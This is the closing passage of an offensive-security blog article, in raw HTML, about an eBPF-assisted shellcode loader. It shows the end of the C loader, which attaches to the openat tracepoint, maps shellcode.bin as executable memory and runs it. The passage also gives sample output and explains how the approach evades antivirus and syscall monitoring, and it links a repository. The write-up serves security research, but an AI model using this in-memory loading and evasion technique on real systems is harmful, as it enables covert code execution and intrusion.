</span></span><span style="display:flex;"><span>        link <span style="color:#ec0000">=</span> <span style="color:#5f5fff">bpf_program__attach</span>(prog);
</span></span><span style="display:flex;"><span>        <span style="color:#ec0000">if</span> (<span style="color:#ec0000">!</span>link) {
</span></span><span style="display:flex;"><span>            <span style="color:#5f5fff">fprintf</span>(stderr, <span style="color:#008900">&#34;Error: Failed to attach eBPF program</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#ec0000">return</span> <span style="color:#008900">1</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;[+] eBPF loading and attached (tracepoint/syscalls:sys_enter_openat)</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">void</span> (<span style="color:#ec0000">*</span>shellcode_func)() <span style="color:#ec0000">=</span> <span style="color:#5f5fff">load_shellcode</span>(<span style="color:#008900">&#34;shellcode.bin&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;[+] Executing shellcode in memory...</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">shellcode_func</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">return</span> <span style="color:#008900">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>
</div>




</div>



<p><strong>But&hellip; what does the loader do?</strong></p>
<ul>
<li><strong>removes memory lock limitations that could prevent eBPF from loading</strong></li>
<li><strong>loads the compiled file <code>ebpf_prog.o</code> with the <code>bpf_object__open_file()</code> function</strong></li>
<li><strong>attaches the eBPF to the <code>sys_enter_openat</code> tracepoint via <code>bpf_program__attach()</code></strong></li>
<li><strong>loads the binary shellcode from a file with <code>mmap()</code> and <code>PROT_EXEC</code> permissions</strong></li>
<li><strong>and finally, executes the shellcode immediately from memory</strong></li>
</ul>
<p><strong>Anyway, the result, if everything goes well, the terminal will display something like:</strong></p>





<div class="tabs tabs-code tabs-left">
  




<style>
  .tabs input#tab-6-0:checked ~ .tab-content-6-0 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-6" id="tab-6-0" checked/>
<label for="tab-6-0" class="tab-label">bash</label>
<div class="tab-content tab-content-6-0">
  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#ec0000">[</span>+<span style="color:#ec0000">]</span> eBPF loading and attached <span style="color:#ec0000">(</span>tracepoint/syscalls:sys_enter_openat<span style="color:#ec0000">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ec0000">[</span>+<span style="color:#ec0000">]</span> Executing shellcode in memory...
</span></span><span style="display:flex;"><span>PWNED BY SLAYER%
</span></span></code></pre></div>
</div>




</div>



<p><strong>Anyway, I will make my github with the repository available at the end of this paper, for more information, along with execution assistance and the like, take a look at its repo!</strong></p>
<hr>
<h1 id="4---security-analysis">
  4 - Security Analysis
  <a class="heading-link" href="#4---security-analysis">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<p><strong>Using eBPF as a tool for loading and executing shellcodes represents a very innovative approach in the offsec area. By pairing the kernel&rsquo;s exec space with common techniques for injecting and executing arbitrary code, the pentester gains a sophisticated way to achieve his goals with discretion and efficiency. However, this approach comes with limitations that need to be understood before its practical application!</strong></p>
<h2 id="advantages">
  Advantages:
  <a class="heading-link" href="#advantages">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<ul>
<li>
<p><strong>1 - Direct memory execution: the shellcode is read directly from a binary file (<code>shellcode.bin</code>) and mapped to memory using the <code>mmap()</code> function with <code>PROT_EXEC</code> permissions. This means that the code never touches the disk in executable format, considerably reducing the chance of being detected by traditional antiviruses or by tools that monitor temporary executable files. Furthermore, the shellcode is executed through a direct call (function pointer), which avoids the use of common syscalls (such as <code>execve</code>) to start a new process, making it difficult to identify by tools that monitor syscalls.</strong></p>
</li>
<li>
<p><strong>2 - Smaller footprint: the user-land loader is extremely simple and small. It only loads the eBPF program and maps the shellcode into memory. This means that the binary can go unnoticed in heuristic scans, since its structure does not contain common malware functions, such as network communication, suspicious embedded strings or unusual API calls.</strong></p>
</li>
<li>
<p><strong>3 - Stealth via kernel-land: using eBPF as an entry point means that the kernel is cooperating in the execution, without the need for more obvious techniques such as <code>LD_PRELOAD</code>, <code>ptrace</code> injection, or modifications to user libs. Additionally, intercepting syscalls (such as <code>openat</code>) via tracepoint allows legitimate user actions (such as opening files in the terminal) to serve as natural triggers for shellcode activation.</strong></p>
</li>
</ul>
<h2 id="limitations">
  Limitations:
  <a class="heading-link" href="#limitations">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<ul>
<li>
<p><strong>1 - Elevated permissions (root): to load eBPF programs and manipulate <code>RLIMIT_MEMLOCK</code>, you must be root or have capabilities such as <code>CAP_SYS_ADMIN</code>. This limits its use in real environments, where privilege escalation may have already occurred.</strong></p>
</li>
<li>
<p><strong>2 - Visibility in <code>trace_pipe</code>: even if the payload is discreet, using <code>bpf_printk()</code> sends messages to <code>/sys/kernel/debug/tracing/trace_pipe</code>. If an analyst is monitoring the <code>trace_pipe</code>, they can see the strings and identify the activity.</strong></p>
</li>
<li>
<p><strong>3 - System resource dependency: The loader depends on specific kernel headers and <code>libbpf</code>, which can cause compatibility issues or make detection easier in protected environments.</strong></p>
</li>
</ul>
<hr>
<h1 id="conclusion">
  Conclusion!
  <a class="heading-link" href="#conclusion">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<p><strong>The combination of eBPF and shellcode loaders demonstrates how it is possible to take advantage of more advanced mechanisms of the Linux kernel to execute code in a discreet and controlled manner. With eBPF, we intercept system calls directly in the kernel, activating custom routines without modifying files on disk or relying on traditional hooks. By loading the shellcode into memory with <code>mmap</code> and execution permissions, we ensure that the execution occurs entirely in user-land, without leaving obvious traces in the system. This technique offers advantages such as a smaller footprint, direct execution from memory and activation based on REAL system events. Although it requires elevated permissions such as root, and can be monitored with appropriate tools, it exemplifies the potential of eBPF not only as an observability and security tool, but also as a mechanism for automation and control of execution flows</strong></p>
<hr>
<h3 id="source-github">
  Source github
  <a class="heading-link" href="#source-github">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<ul>
<li><strong><a href="https://github.com/slayerkkkk/ebpf_loader"  class="external-link" target="_blank" rel="noopener">ebpf_loader - github</a></strong></li>
</ul>
<h3 id="sources-used-to-build-this-article">
  <strong>Sources used to build this article</strong>
  <a class="heading-link" href="#sources-used-to-build-this-article">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<ul>
<li><strong><a href="https://docs.kernel.org/bpf/index.html"  class="external-link" target="_blank" rel="noopener">Linux Kernel Documentation - eBPF</a></strong></li>
<li><strong><a href="https://man7.org/linux/man-pages/man2/bpf.2.html"  class="external-link" target="_blank" rel="noopener">bpf(2) - Linux syscall manual</a></strong></li>
<li><strong><a href="https://github.com/libbpf/libbpf"  class="external-link" target="_blank" rel="noopener">libbpf: BPF CO-RE reference and usage</a></strong></li>
<li><strong><a href="http://www.brendangregg.com/blog/2019-01-01/learn-ebpf-tracing.html"  class="external-link" target="_blank" rel="noopener">tracepoints in eBPF - Brendan Gregg</a></strong></li>
<li><strong><a href="https://docs.kernel.org/trace/tracepoints.html"  class="external-link" target="_blank" rel="noopener">Understanding Tracepoints â€” Kernel docs</a></strong></li>
<li><strong><a href="https://man7.org/linux/man-pages/man2/getrlimit.2.html"  class="external-link" target="_blank" rel="noopener">RLIMIT_MEMLOCK - getrlimit(2)</a></strong></li>
<li><strong><a href="https://man7.org/linux/man-pages/man2/mmap.2.html"  class="external-link" target="_blank" rel="noopener">mmap(2) - Memory mapping</a></strong></li>
<li><strong><a href="https://man7.org/linux/man-pages/man2/ptrace.2.html"  class="external-link" target="_blank" rel="noopener">ptrace(2) and ptrace-based introspection</a></strong></li>
<li><strong><a href="https://lwn.net/Articles/740157/"  class="external-link" target="_blank" rel="noopener">eBPF Security Model (LWN)</a></strong></li>
<li><strong><a href="https://ebpf.io/what-is-ebpf/"  class="external-link" target="_blank" rel="noopener">The eBPF Handbook (by Quentin Monnet)</a></strong></li>
</ul>

      </div>


      <footer>
        


        
        
        
        
        
        
        
      </footer>
    </article>

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css"
    integrity="sha384-vKruj+a13U8yHIkAyGgK1J3ArTLzrFGBbBc0tDp4ad/EyewESeXE/Iv67Aj8gKZ0" crossorigin="anonymous">
  
  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js"
    integrity="sha384-PwRUT/YqbnEjkZO0zZxNqcxACrXe+j766U2amXcgMg5457rve2Y7I6ZJSm2A0mS4" crossorigin="anonymous"></script>
  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js"
    integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous"
    onload="renderMathInElement(document.body,
      {
        delimiters: [
          {left: '$$', right: '$$', display:true},
          {left: '$', right: '$', display:false},
          {left: '\\(', right: '\\)', display: false},
          {left: '\\[', right: '\\]', display: true}
        ]
      }
    );"></script>
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    Â©
    
    2025
     pwnbuffer 
    Â·
    
    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder (modified)</a>.
    
  </section>
</footer>

  </main>

  

  
  
  <script src="https://pwnbuffer.org/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
  

  

  


  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>
</html>
